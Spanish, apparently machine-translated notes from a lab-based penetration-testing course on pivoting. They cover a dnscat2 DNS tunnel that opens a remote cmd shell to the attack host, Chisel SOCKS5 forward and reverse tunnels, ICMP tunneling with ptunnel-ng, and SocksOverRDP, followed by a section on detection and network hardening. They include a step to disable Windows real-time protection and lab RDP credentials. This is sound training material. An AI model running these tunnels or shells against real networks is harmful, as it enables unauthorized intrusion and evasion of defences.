PS C:\htb> Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd 
```

Debemos usar el secreto pre-compartido (`-PreSharedSecret`) generado en el servidor para garantizar que nuestra sesión esté establecida y encriptada. Si todos los pasos se completan correctamente, veremos una sesión establecida con nuestro servidor.

#### Confirmación del Establecimiento de la Sesión

  Túnel DNS con Dnscat2

```shell-session
New window created: 1
Session 1 Security: ENCRYPTED AND VERIFIED!
(the security depends on the strength of your pre-shared secret!)

dnscat2>
```

Podemos enumerar las opciones que tenemos con dnscat2 ingresando `?` en el mensaje.

#### Listado de opciones de dnscat2

  Túnel DNS con Dnscat2

```shell-session
dnscat2> ?

Here is a list of commands (use -h on any of them for additional help):
* echo
* help
* kill
* quit
* set
* start
* stop
* tunnels
* unset
* window
* windows
```

Podemos usar dnscat2 para interactuar con las sesiones y avanzar más en un entorno objetivo en los compromisos. No cubriremos todas las posibilidades con dnscat2 en este módulo, pero se recomienda encarecidamente practicar con él y tal vez incluso encontrar formas creativas de usarlo en un compromiso. Interactuemos con nuestra sesión establecida y caigamos en un shell.

#### Interactuar con la Sesión Establecida

  Túnel DNS con Dnscat2

```shell-session
dnscat2> window -i 1
New window created: 1
history_size (session) => 1000
Session 1 Security: ENCRYPTED AND VERIFIED!
(the security depends on the strength of your pre-shared secret!)
This is a console session!

That means that anything you type will be sent as-is to the
client, and anything they type will be displayed as-is on the
screen! If the client is executing a command and you don't
see a prompt, try typing 'pwd' or something!

To go back, type ctrl-z.

Microsoft Windows [Version 10.0.18363.1801]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
exec (OFFICEMANAGER) 1>
```

# SOCKS5 Túnel con cincel

[Cincel](https://github.com/jpillora/chisel) es una herramienta de túnel basada en TCP/UDP escrita en [GO](https://go.dev/) eso usa HTTP para transportar datos que están asegurados usando SSH. `Chisel` puede crear una conexión de túnel cliente-servidor en un entorno restringido de firewall. Consideremos un escenario en el que tenemos que tunelizar nuestro tráfico a un servidor web en el `172.16.5.0`/`23` red (red interna). Tenemos el Controlador de Dominio con la dirección `172.16.5.19`. Esto no es directamente accesible para nuestro host de ataque ya que nuestro host de ataque y el controlador de dominio pertenecen a diferentes segmentos de red. Sin embargo, dado que hemos comprometido el servidor Ubuntu, podemos iniciar un servidor Chisel en él que escuchará en un puerto específico y reenviará nuestro tráfico a la red interna a través del túnel establecido.

## Configuración y Uso de Cincel

Antes de que podamos usar Chisel, necesitamos tenerlo en nuestro anfitrión de ataque. Si no tenemos Chisel en nuestro host de ataque, podemos clonar el repositorio del proyecto utilizando el comando directamente a continuación:

#### Clonación de Cincel

  SOCKS5 Túnel con cincel

```shell-session
vcrdcr@htb[/htb]$ git clone https://github.com/jpillora/chisel.git
```

Necesitaremos el lenguaje de programación `Go` instalado en nuestro sistema para construir el binario Chisel. Con Go instalado en el sistema, podemos pasar a ese directorio y usar `go build` para construir el binario de Chisel.

**Nota:** Dependiendo de la versión de la `glibc` biblioteca instalada en ambos sistemas (objetivo y estación de trabajo), puede haber discrepancias que podrían resultar en un error. Cuando esto sucede, es importante comparar las versiones de la biblioteca en ambos sistemas, o podemos usar una versión preconstruida anterior de `chisel`, que se puede encontrar en el `Releases` sección del repositorio de GitHub.

#### Construyendo el Binario de Cincel

  SOCKS5 Túnel con cincel

```shell-session
vcrdcr@htb[/htb]$ cd chisel
go build
```

Puede ser útil tener en cuenta el tamaño de los archivos que transferimos a los objetivos en las redes de nuestros clientes, no solo por razones de rendimiento, sino también considerando la detección. Dos recursos beneficiosos para complementar este concepto en particular son la publicación de blog de Oxdf "[Túnel con cincel y SSF](https://0xdf.gitlab.io/cheatsheets/chisel)"y el recorrido de IppSec de la caja `Reddish`. IppSec comienza su explicación de Chisel, construyendo el binario y reduciendo el tamaño del binario en la marca 24:29 de su [video](https://www.youtube.com/watch?v=Yp4oxoQIBAM&t=1469s).

Una vez que se construye el binario, podemos usar `SCP` para transferirlo al host de pivote objetivo.

#### Transferencia de Chisel Binary a Pivot Host

  SOCKS5 Túnel con cincel

```shell-session
vcrdcr@htb[/htb]$ scp chisel ubuntu@10.129.202.64:~/
 
ubuntu@10.129.202.64's password: 
chisel                                        100%   11MB   1.2MB/s   00:09    
```

Luego podemos iniciar el servidor/escuchador de Chisel.

#### Ejecutar el Servidor Chisel en el Host Pivot

  SOCKS5 Túnel con cincel

```shell-session
ubuntu@WEB01:~$ ./chisel server -v -p 1234 --socks5

2022/05/05 18:16:25 server: Fingerprint Viry7WRyvJIOPveDzSI2piuIvtu9QehWw9TzA3zspac=
2022/05/05 18:16:25 server: Listening on http://0.0.0.0:1234
```

**SI LA MAQUINA NO PUEDE EJECUTARLO PUEDE SER POR LA VERSION DE CHISEL Y SE RECOMIENDA DESCARGAR UNA VERSION ANTERIOR**

El oyente de Chisel escuchará las conexiones entrantes en el puerto `1234` uso de SOCKS5 (`--socks5`) y reenviarlo a todas las redes a las que se puede acceder desde el host pivote. En nuestro caso, el host pivote tiene una interfaz en la red 172.16.5.0/23, lo que nos permitirá llegar a los hosts en esa red.

Podemos iniciar un cliente en nuestro host de ataque y conectarnos al servidor Chisel.

#### Conexión al Servidor Chisel

  SOCKS5 Túnel con cincel

```shell-session
vcrdcr@htb[/htb]$ ./chisel client -v 10.129.202.64:1234 socks

2022/05/05 14:21:18 client: Connecting to ws://10.129.202.64:1234
2022/05/05 14:21:18 client: tun: proxy#127.0.0.1:1080=>socks: Listening
2022/05/05 14:21:18 client: tun: Bound proxies
2022/05/05 14:21:19 client: Handshaking...
2022/05/05 14:21:19 client: Sending config
2022/05/05 14:21:19 client: Connected (Latency 120.170822ms)
2022/05/05 14:21:19 client: tun: SSH connected
```

Como puede ver en la salida anterior, el cliente Chisel ha creado un túnel TCP/UDP a través de HTTP asegurado usando SSH entre el servidor Chisel y el cliente y ha comenzado a escuchar en el puerto 1080. Ahora podemos modificar nuestro archivo proxychains.conf ubicado en `/etc/proxychains.conf` y agregar `1080` puerto al final para que podamos usar proxychains para pivotar usando el túnel creado entre el puerto 1080 y el túnel SSH.

#### Edición y confirmación de proxychains.conf

Podemos utilizar cualquier editor de texto que nos gustaría editar el archivo proxychains.conf, luego confirmar nuestros cambios de configuración utilizando `tail`.

  SOCKS5 Túnel con cincel

```shell-session
vcrdcr@htb[/htb]$ tail -f /etc/proxychains.conf 

#
#       proxy types: http, socks4, socks5
#        ( auth types supported: "basic"-http  "user/pass"-socks )
#
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
# socks4 	127.0.0.1 9050
socks5 127.0.0.1 1080
```

Ahora, si usamos proxychains con RDP, podemos conectarnos a la CC en la red interna a través del túnel que hemos creado al host de Pivot.

#### Pivotando al DC

  SOCKS5 Túnel con cincel

```shell-session
vcrdcr@htb[/htb]$ proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```

---

## Cincel Pivote Inverso

En el ejemplo anterior, utilizamos la máquina comprometida (Ubuntu) como nuestro servidor Chisel, que figura en el puerto 1234. Aún así, puede haber escenarios en los que las reglas del firewall restrinjan las conexiones entrantes a nuestro objetivo comprometido. En tales casos, podemos usar Chisel con la opción inversa.

Cuando el servidor de Chisel tiene `--reverse` habilitado, los controles remotos se pueden prefijar con `R` para denotar invertido. El servidor escuchará y aceptará las conexiones, y serán proxied a través del cliente, que especificó el control remoto. Remota inversa especificando `R:socks` escuchará en el puerto de calcetines predeterminado del servidor (1080) y terminará la conexión en el proxy SOCKS5 interno del cliente.

Iniciaremos el servidor en nuestro host de ataque con la opción `--reverse`.

#### Iniciar el Servidor Chisel en nuestro Anfitrión de Ataque

  SOCKS5 Túnel con cincel

```shell-session
vcrdcr@htb[/htb]$ sudo ./chisel server --reverse -v -p 1234 --socks5

2022/05/30 10:19:16 server: Reverse tunnelling enabled
2022/05/30 10:19:16 server: Fingerprint n6UFN6zV4F+MLB8WV3x25557w/gHqMRggEnn15q9xIk=
2022/05/30 10:19:16 server: Listening on http://0.0.0.0:1234
```

Luego nos conectamos desde Ubuntu (pivot host) a nuestro host de ataque, utilizando la opción `R:socks`

#### Conectando el Cliente de Chisel a nuestro Anfitrión de Ataque

  SOCKS5 Túnel con cincel

```shell-session
ubuntu@WEB01$ ./chisel client -v 10.10.14.17:1234 R:socks

2022/05/30 14:19:29 client: Connecting to ws://10.10.14.17:1234
2022/05/30 14:19:29 client: Handshaking...
2022/05/30 14:19:30 client: Sending config
2022/05/30 14:19:30 client: Connected (Latency 117.204196ms)
2022/05/30 14:19:30 client: tun: SSH connected
```

Podemos utilizar cualquier editor que nos gustaría editar el archivo proxychains.conf, luego confirmar nuestros cambios de configuración utilizando `tail`.

#### Edición y confirmación de proxychains.conf

  SOCKS5 Túnel con cincel

```shell-session
vcrdcr@htb[/htb]$ tail -f /etc/proxychains.conf 

[ProxyList]
# add proxy here ...
# socks4    127.0.0.1 9050
socks5 127.0.0.1 1080 
```

Si utilizamos proxychains con RDP, podemos conectarnos a la CC en la red interna a través del túnel que hemos creado al host de Pivot.

  SOCKS5 Túnel con cincel

```shell-session
vcrdcr@htb[/htb]$ proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```

**Nota:** Si recibe un mensaje de error con cincel en el objetivo, intente con un [versión diferente](https://github.com/jpillora/chisel/releases).

# ICMP Túnel con SOCKS

ICMP tuneling encapsula su tráfico dentro `ICMP packets` conteniendo `echo requests` y `responses`. El túnel ICMP solo funcionaría cuando se permiten respuestas de ping dentro de una red cortafuegos. Cuando un host dentro de una red firewall puede hacer ping a un servidor externo, puede encapsular su tráfico dentro de la solicitud de eco de ping y enviarlo a un servidor externo. El servidor externo puede validar este tráfico y enviar una respuesta adecuada, que es extremadamente útil para la exfiltración de datos y la creación de túneles de pivote a un servidor externo.

Usaremos el [ptúnel-ng](https://github.com/utoni/ptunnel-ng) herramienta para crear un túnel entre nuestro servidor Ubuntu y nuestro host de ataque. Una vez que se crea un túnel, podremos proxy nuestro tráfico a través del `ptunnel-ng client`. Podemos empezar el `ptunnel-ng server` en el host de pivote objetivo. Comencemos configurando ptunnel-ng.

---

## Configuración y uso de ptunnel-ng

Si ptunnel-ng no está en nuestro host de ataque, podemos clonar el proyecto usando git.

#### Clonación Ptunnel-ng

  ICMP Túnel con CALCETINES

```shell-session
vcrdcr@htb[/htb]$ git clone https://github.com/utoni/ptunnel-ng.git
```

Una vez que el repositorio ptunnel-ng se clona a nuestro anfitrión de ataque, podemos ejecutar el `autogen.sh` script ubicado en la raíz del directorio ptunnel-ng.

#### Construyendo Ptunnel-ng con Autogen.sh

  ICMP Túnel con CALCETINES

```shell-session
vcrdcr@htb[/htb]$ sudo ./autogen.sh 
```

Después de ejecutar autogen.sh, ptunnel-ng se puede utilizar desde el lado del cliente y del servidor. Ahora tendremos que transferir el repositorio de nuestro host de ataque al host objetivo. Como en secciones anteriores, podemos usar SCP para transferir los archivos. Si queremos transferir todo el repositorio y los archivos contenidos en el interior, tendremos que utilizar el `-r` opción con SCP.

#### Enfoque alternativo de construir un binario estático

  ICMP Túnel con CALCETINES

```shell-session
vcrdcr@htb[/htb]$ sudo apt install automake autoconf -y
vcrdcr@htb[/htb]$ cd ptunnel-ng/
vcrdcr@htb[/htb]$ sed -i '$s/.*/LDFLAGS=-static "${NEW_WD}\/configure" --enable-static $@ \&\& make clean \&\& make -j${BUILDJOBS:-4} all/' autogen.sh
vcrdcr@htb[/htb]$ ./autogen.sh
```

#### Transferencia de Ptunnel-ng al Anfitrión Pivot

  ICMP Túnel con CALCETINES

```shell-session
vcrdcr@htb[/htb]$ scp -r ptunnel-ng ubuntu@10.129.202.64:~/
```

Con ptunnel-ng en el host de destino, podemos iniciar el lado del servidor del túnel ICMP utilizando el comando directamente debajo.

#### Iniciar el servidor ptunnel-ng en el Host de destino

  ICMP Túnel con CALCETINES

```shell-session
ubuntu@WEB01:~/ptunnel-ng/src$ sudo ./ptunnel-ng -r10.129.202.64 -R22

[sudo] password for ubuntu: 
./ptunnel-ng: /lib/x86_64-linux-gnu/libselinux.so.1: no version information available (required by ./ptunnel-ng)
[inf]: Starting ptunnel-ng 1.42.
[inf]: (c) 2004-2011 Daniel Stoedle, <daniels@cs.uit.no>
[inf]: (c) 2017-2019 Toni Uhlig,     <matzeton@googlemail.com>
[inf]: Security features by Sebastien Raveau, <sebastien.raveau@epita.fr>
[inf]: Forwarding incoming ping packets over TCP.
[inf]: Ping proxy is listening in privileged mode.
[inf]: Dropping privileges now.
```

La dirección IP siguiente `-r` debería ser la IP de la caja de salto en la que queremos que ptunnel-ng acepte conexiones. En este caso, cualquier IP accesible desde nuestro host de ataque sería lo que usaríamos. Nos beneficiaríamos de usar este mismo pensamiento y consideración durante un compromiso real.

De vuelta en el host de ataque, podemos intentar conectarnos al servidor ptunnel-ng (`-p <ipAddressofTarget>`) pero asegúrese de que esto suceda a través del puerto local 2222 (`-l2222`). La conexión a través del puerto local 2222 nos permite enviar tráfico a través del túnel ICMP.

#### Conexión a ptunnel-ng Server desde Attack Host

  ICMP Túnel con CALCETINES

```shell-session
vcrdcr@htb[/htb]$ sudo ./ptunnel-ng -p10.129.202.64 -l2222 -r10.129.202.64 -R22

[inf]: Starting ptunnel-ng 1.42.
[inf]: (c) 2004-2011 Daniel Stoedle, <daniels@cs.uit.no>
[inf]: (c) 2017-2019 Toni Uhlig,     <matzeton@googlemail.com>
[inf]: Security features by Sebastien Raveau, <sebastien.raveau@epita.fr>
[inf]: Relaying packets from incoming TCP streams.
```

Con el túnel ptunnel-ng ICMP establecido con éxito, podemos intentar conectarnos al objetivo utilizando SSH a través del puerto local 2222 (`-p2222`).

#### Tunelizar una conexión SSH a través de un túnel ICMP

  ICMP Túnel con CALCETINES

```shell-session
vcrdcr@htb[/htb]$ ssh -p2222 -lubuntu 127.0.0.1

ubuntu@127.0.0.1's password: 
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-91-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed 11 May 2022 03:10:15 PM UTC

  System load:             0.0
  Usage of /:              39.6% of 13.72GB
  Memory usage:            37%
  Swap usage:              0%
  Processes:               183
  Users logged in:         1
  IPv4 address for ens192: 10.129.202.64
  IPv6 address for ens192: dead:beef::250:56ff:feb9:52eb
  IPv4 address for ens224: 172.16.5.129

 * Super-optimized for small spaces - read how we shrank the memory
   footprint of MicroK8s to make it the smallest full K8s around.

   https://ubuntu.com/blog/microk8s-memory-optimisation

144 updates can be applied immediately.
97 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable


Last login: Wed May 11 14:53:22 2022 from 10.10.14.18
ubuntu@WEB01:~$ 
```

Si se configura correctamente, podremos ingresar credenciales y tener una sesión SSH a través del túnel ICMP.

En el lado cliente y servidor de la conexión, notaremos que ptunnel-ng nos proporciona registros de sesión y estadísticas de tráfico asociadas con el tráfico que pasa a través del túnel ICMP. Esta es una forma en que podemos confirmar que nuestro tráfico está pasando de cliente a servidor utilizando ICMP.

#### Viendo Estadísticas de Tráfico de Túneles

  ICMP Túnel con CALCETINES

```shell-session
inf]: Incoming tunnel request from 10.10.14.18.
[inf]: Starting new session to 10.129.202.64:22 with ID 20199
[inf]: Received session close from remote peer.
[inf]: 
Session statistics:
[inf]: I/O:   0.00/  0.00 mb ICMP I/O/R:      248/      22/       0 Loss:  0.0%
[inf]: 
```

También podemos usar este túnel y SSH para realizar reenvío dinámico de puertos para permitirnos usar proxychains de varias maneras.

#### Habilitación del Reenvío Dinámico de Puertos sobre SSH

  ICMP Túnel con CALCETINES

```shell-session
vcrdcr@htb[/htb]$ ssh -D 9050 -p2222 -lubuntu 127.0.0.1

ubuntu@127.0.0.1's password: 
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-91-generic x86_64)
<snip>
```

Podríamos usar proxychains con Nmap para escanear objetivos en la red interna (172.16.5.x). Según nuestros descubrimientos, podemos intentar conectarnos con el objetivo.

#### Proxychaining a través del túnel ICMP

  ICMP Túnel con CALCETINES

```shell-session
vcrdcr@htb[/htb]$ proxychains nmap -sV -sT 172.16.5.19 -p3389

ProxyChains-3.1 (http://proxychains.sf.net)
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-11 11:10 EDT
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:80-<><>-OK
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:3389-<><>-OK
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:3389-<><>-OK
Nmap scan report for 172.16.5.19
Host is up (0.12s latency).

PORT     STATE SERVICE       VERSION
3389/tcp open  ms-wbt-server Microsoft Terminal Services
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.78 seconds
```

---

## Consideraciones de Análisis de Tráfico de Red

Es importante que confirmemos que las herramientas que estamos utilizando funcionan como se anuncia y que las hemos configurado y estamos operando correctamente. En el caso del tráfico de túneles a través de diferentes protocolos enseñados en esta sección con túneles ICMP, podemos beneficiarnos de analizar el tráfico que generamos con un analizador de paquetes como `Wireshark`. Echa un vistazo de cerca al clip corto a continuación.

![GIF mostrando el tráfico SSH en Wireshark.](https://academy.hackthebox.com/storage/modules/158/analyzingTheTraffic.gif)

En la primera parte de este clip, se establece una conexión a través de SSH sin usar el túnel ICMP. Podemos notar eso `TCP` y `SSHv2` el tráfico es capturado.

El comando utilizado en el clip: `ssh ubuntu@10.129.202.64`

En la segunda parte de este clip, se establece una conexión a través de SSH utilizando el túnel ICMP. Observe el tipo de tráfico que se captura cuando se realiza.

Comando utilizado en el clip: `ssh -p2222 -lubuntu 127.0.0.1`

---

Nota: Al generar su objetivo, le pedimos que espere de 3 a 5 minutos hasta que todo el laboratorio con todas las configuraciones esté configurado para que la conexión a su objetivo funcione sin problemas.

Nota: Considere las versiones de GLIBC, asegúrese de estar a la par con la del objetivo.


# ----- Double Pivots -----

# RDP and SOCKS Tunneling with SocksOverRDP

A menudo hay ocasiones durante una evaluación en las que podemos estar limitados a una red de Windows y es posible que no podamos usar SSH para pivotar. Tendríamos que usar herramientas disponibles para los sistemas operativos Windows en estos casos. [CalcetinesOverRDP](https://github.com/nccgroup/SocksOverRDP) es un ejemplo de una herramienta que utiliza `Dynamic Virtual Channels` (`DVC`) desde la función Servicio de Escritorio remoto de Windows. DVC es responsable de tunelizar paquetes a través de la conexión RDP. Algunos ejemplos del uso de esta característica serían la transferencia de datos del portapapeles y el intercambio de audio. Sin embargo, esta característica también se puede usar para tunelizar paquetes arbitrarios a través de la red. Podemos usar `SocksOverRDP` para tunelizar nuestros paquetes personalizados y luego proxy a través de él. Usaremos la herramienta [Proxificador](https://www.proxifier.com/) como nuestro servidor proxy.

Podemos comenzar descargando los binarios apropiados a nuestro host de ataque para realizar este ataque. Tener los binarios en nuestro host de ataque nos permitirá transferirlos a cada objetivo cuando sea necesario. Necesitaremos:

1. [Binarios SocksOverRDP x64](https://github.com/nccgroup/SocksOverRDP/releases)
    
2. [Proxificador Binario Portátil](https://www.proxifier.com/download/#win-tab)
    

- Podemos buscar `ProxifierPE.zip`

Luego podemos conectarnos al objetivo usando xfreerdp y copiar el `SocksOverRDPx64.zip` archivo al objetivo. Desde el objetivo de Windows, tendremos que cargar el SocksOverRDP.dll usando regsvr32.exe.

#### Cargando SocksOverRDP.dll usando regsvr32.exe

**DESACTIVAR LA PROTECCION A TIEMPO REAL DE WINDOWS SECURITY**

  Túnel RDP y SOCKS con SocksOverRDP

```cmd-session
C:\Users\htb-student\Desktop\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
```

![Símbolo del sistema que muestra la lista de directorios de archivos SocksOverRDP. Un diálogo RegSvr32 confirma el registro exitoso de SocksOverRDP-Plugin.dll.](https://academy.hackthebox.com/storage/modules/158/socksoverrdpdll.png)

Ahora podemos conectarnos a 172.16.5.19 a través de RDP usando `mstsc.exe`, y deberíamos recibir un mensaje de que el complemento SocksOverRDP está habilitado, y se escuchará el 127.0.0.1:1080. Podemos usar las credenciales `victor:pass@123` para conectarse a 172.16.5.19.

![Símbolo del sistema con Conexión de Escritorio Remoto a 172.16.5.19 como usuario 'victor'. SocksOverRDP plugin habilitado, escuchando el 127.0.0.1:1080.](https://academy.hackthebox.com/storage/modules/158/pivotingtoDC.png)

Tendremos que transferir SocksOverRDPx64.zip o simplemente el SocksOverRDP-Server.exe al 172.16.5.19. Luego podemos iniciar SocksOverRDP-Server.exe con privilegios de administrador.

***EN EL CASO DE QUE NO FUNCIONE LA CONEXION VAMOS A LA PESTAÑA "EXPERIENCE" Y SELECCIONAMOS LA OPCIÓN DE "MODEM"***


![Terminal que muestra Calcetines Sobre RDP de Balazs Bucsay con un canal abierto sobre RDP.](https://academy.hackthebox.com/storage/modules/158/executingsocksoverrdpserver.png)

Cuando volvamos a nuestro objetivo y verifiquemos con Netstat, deberíamos ver que nuestro oyente SOCKS comenzó el 127.0.0.1:1080.

---

#### Se inicia la Confirmación del Listador SOCKS

  Túnel RDP y SOCKS con SocksOverRDP

```cmd-session
C:\Users\htb-student\Desktop\SocksOverRDP-x64> netstat -antb | findstr 1080

  TCP    127.0.0.1:1080         0.0.0.0:0              LISTENING
```

Después de iniciar nuestro oyente, podemos transferir Proxifier portátil al objetivo de Windows 10 (en la red 10.129.x.x) y configurarlo para reenviar todos nuestros paquetes a 127.0.0.1:1080. Proxifier enrutará el tráfico a través del host y el puerto dados. Vea el clip a continuación para obtener un recorrido rápido de la configuración de Proxifier.

#### Configuración de Proxifier

![GIF que muestra la adición de un servidor SOCKS5 en Proxifier.](https://academy.hackthebox.com/storage/modules/158/configuringproxifier.gif)

Con Proxifier configurado y en ejecución, podemos iniciar mstsc.exe, y utilizará Proxifier para pivotar todo nuestro tráfico a través de 127.0.0.1:1080, que lo tunelizará a través de RDP a 172.16.5.19, que luego lo enrutará a 172.16.6.155 usando SocksOverRDP-server.exe.

![Escritorio con Calcetines sobre terminal RDP, Proxificador que muestra la conexión a 172.16.6.155:3389 y sesión de Escritorio remoto a 172.16.6.155](https://academy.hackthebox.com/storage/modules/158/rdpsockspivot.png)

#### Consideraciones de Rendimiento de RDP

Al interactuar con nuestras sesiones de RDP en un compromiso, podemos encontrarnos luchando con un rendimiento lento en una sesión determinada, especialmente si estamos administrando varias sesiones de RDP simultáneamente. Si este es el caso, podemos acceder al `Experience` pestaña en mstsc.exe y conjunto `Performance` a `Modem`.

![Ventana de configuración de conexión de Escritorio remoto que muestra las opciones de rendimiento para un módem de 56 kbps. Proxifier Portable enumera las conexiones al 172.16.6.155:3389. Símbolo del sistema muestra el comando netstat con el puerto 1080 escuchando.](https://academy.hackthebox.com/storage/modules/158/rdpexpen.png)

---

Nota: Al generar su objetivo, le pedimos que espere de 3 a 5 minutos hasta que todo el laboratorio con todas las configuraciones esté configurado para que la conexión a su objetivo funcione sin problemas.

# ----- DETECCIÓN Y PREVENCIÓN-----
---

A lo largo de este módulo, hemos dominado varias técnicas diferentes que se pueden utilizar desde un `offensive perspective`. Como probadores de penetración, también deberíamos preocuparnos por las mitigaciones y detecciones que se pueden implementar para ayudar a los defensores a detener este tipo de TTP. Esto es crucial ya que se espera que proporcionemos a nuestros clientes soluciones o soluciones potenciales a los problemas que encontramos y explotamos durante nuestras evaluaciones. Algunos pueden ser:

- Cambios de hardware físico
- Cambios en la infraestructura de red
- Modificaciones para alojar líneas de base

Esta sección cubrirá algunas de estas correcciones y lo que significan para nosotros y los encargados de defender la red.

---

## Establecer una Línea de Base

Comprender todo lo que está presente y sucede en un entorno de red es vital. Como defensores, deberíamos poder hacerlo rápidamente `identify` y `investigate` cualquier nuevo hosts que aparezca en nuestra red, cualquier nueva herramienta o aplicación que se instale en hosts fuera de nuestro catálogo de aplicaciones, y cualquier tráfico de red nuevo o único generado. Una auditoría de todo lo que se enumera a continuación debe hacerse anualmente, si no cada pocos meses, para garantizar que sus registros estén actualizados. Entre algunas de las consideraciones con las que podemos empezar están:

#### Cosas para Documentar y Rastrear

- Registros DNS, copias de seguridad de dispositivos de red y configuraciones DHCP
- Inventario de aplicaciones completo y actual
- Una lista de todos los hosts empresariales y su ubicación
- Usuarios que tienen permisos elevados
- Una lista de cualquier host de doble homed (Más de una interfaz de red)
- Mantener un diagrama de red visual de su entorno

Junto con el seguimiento de los elementos anteriores, mantener actualizado un diagrama de red visual de su entorno puede ser muy efectivo al solucionar problemas o responder a un incidente. [Netbrain](https://www.netbraintech.com/) es un excelente ejemplo de una herramienta que puede proporcionar esta funcionalidad y acceso interactivo a todos los dispositivos en el diagrama. Si queremos una manera de documentar nuestro entorno de red visualmente, podemos utilizar una herramienta gratuita como [diagramas.net](https://app.diagrams.net/). Por último, para nuestra línea de base, comprender qué activos son críticos para el funcionamiento de su organización y monitorear esos activos es imprescindible.

---

## Personas, Procesos y Tecnología

El endurecimiento de la red se puede organizar en las categorías _Personas_, _Proceso,_ y _Tecnología_. Estas medidas de endurecimiento abarcarán el hardware, el software y los aspectos humanos de cualquier red. Comencemos con el `human` (`People`) aspecto.

### Personas

Incluso en el entorno más endurecido, los usuarios a menudo se consideran el eslabón más débil. Hacer cumplir las mejores prácticas de seguridad para usuarios y administradores estándar evitará "ganancias fáciles" para los pentesters y atacantes maliciosos. También debemos esforzarnos por mantenernos a nosotros mismos y a los usuarios a los que servimos educados y conscientes de las amenazas. Las siguientes medidas son una excelente manera de comenzar el proceso de asegurar el elemento humano de cualquier entorno empresarial.

### BYOD y Otras Preocupaciones

Bring Your Own Device (BYOD) se está volviendo frecuente en la fuerza laboral actual. Con la mayor aceptación del trabajo remoto y los arreglos de trabajo híbrido, más personas están utilizando sus dispositivos personales para realizar tareas relacionadas con el trabajo. Esto presenta riesgos únicos para las organizaciones porque sus empleados pueden conectarse a redes y recursos compartidos propiedad de la organización. La organización tiene una capacidad limitada para administrar y asegurar un dispositivo de propiedad personal, como una computadora portátil o un teléfono inteligente, dejando la responsabilidad de asegurar el dispositivo en gran medida con el propietario. Si el propietario del dispositivo sigue prácticas de seguridad deficientes, no solo se ponen en riesgo de compromiso, sino que ahora también pueden extender estos mismos riesgos a sus empleadores. Considere el ejemplo práctico a continuación para construir una perspectiva sobre esto:

Escenario: Nick es un gerente de logística trabajador y dedicado para Inlanefreight. Ha realizado un gran trabajo a lo largo de los años, y la compañía confía en él lo suficiente como para permitirle trabajar desde casa tres días a la semana. Al igual que muchos empleados de Inlanefreight, Nick también aprovecha la disposición de Inlanefreight para permitir que los empleados usen sus propios dispositivos para tareas relacionadas con el trabajo en el hogar y en los entornos de red de la oficina. Nick también disfruta de los juegos y, a veces, torrents de videojuegos ilegalmente. Un juego que descargó e instaló también instaló malware que le dio a un atacante acceso remoto a su computadora portátil. Cuando Nick entra en la oficina, se conecta a la red WiFi que extiende el acceso a la red de empleados. Cualquiera puede llegar a los Controladores de Dominio, Acciones de Archivo, impresoras y otros recursos de red importantes desde esta red.Debido a que hay malware en el sistema de Nick, el atacante también tiene acceso a estos recursos de red y puede intentar girar a través de la red de Inlanefreight debido a las malas prácticas de seguridad de Nick en su computadora personal.

Usando `multi-factor authentication` (Algo que tiene, algo que sabe, algo que es, ubicación, etc.) son excelentes factores a considerar al implementar mecanismos de autenticación. Implementar dos o más factores para la autenticación (especialmente para cuentas administrativas y acceso) es una excelente manera de dificultar que un atacante obtenga acceso completo a una cuenta en caso de que la contraseña o el hash de un usuario se vean comprometidos.

Además de garantizar que sus usuarios no puedan causar daños, debemos considerar nuestras políticas y procedimientos para el acceso y control del dominio. Las organizaciones más grandes también deben considerar construir un equipo del Centro de Operaciones de Seguridad (SOC) o usar un `SOC as a Service` para monitorear constantemente lo que está sucediendo dentro del entorno de TI 24/7. Las tecnologías defensivas modernas han recorrido un largo camino y pueden ayudar con muchas tácticas defensivas diferentes, pero necesitamos operadores humanos para garantizar que funcionen como se supone que deben hacerlo. `Incident response` es algo en lo que aún no podemos automatizar completamente el elemento humano. Así que tener un adecuado `incident response plan` listo es esencial estar preparado para una violación.

---

### Procesos

Mantener y hacer cumplir las políticas y procedimientos puede afectar significativamente la postura general de seguridad de una organización. Es casi imposible responsabilizar a los empleados de una organización sin políticas definidas. Hace que sea difícil responder a un incidente sin procedimientos definidos y practicados, como un `disaster recovery plan`. Los siguientes elementos pueden ayudar a comenzar a definir los de una organización `processes`, `policies`, y `procedures` en relación con la seguridad de sus usuarios y el entorno de red.

- Políticas y procedimientos adecuados para el monitoreo y la gestión de activos
    - Las auditorías de host, el uso de etiquetas de activos y los inventarios periódicos de activos pueden ayudar a garantizar que los hosts no se pierdan
- Políticas de control de acceso (aprovisionamiento/desaprovisionamiento de cuentas de usuario), mecanismos de autenticación multifactor
- Procesos para aprovisionamiento y desmantelamiento de hosts (es decir, guía de endurecimiento de seguridad de referencia, imágenes de oro)
- Cambiar los procesos de gestión para documentar formalmente `who did what` y `when they did it`

### Tecnología

Verifique periódicamente la red en busca de configuraciones erróneas heredadas y amenazas nuevas y emergentes. A medida que se realizan cambios en un entorno, asegúrese de que no se introduzcan configuraciones erróneas comunes mientras se presta atención a las vulnerabilidades introducidas por las herramientas o aplicaciones utilizadas en el entorno. Si es posible, intente parchar o mitigar esos riesgos con el entendimiento de que la tríada de la CIA es un acto de equilibrio, y la aceptación del riesgo que presenta una vulnerabilidad puede ser la mejor opción para su entorno.

---

## Desde el Exterior Moviéndose En

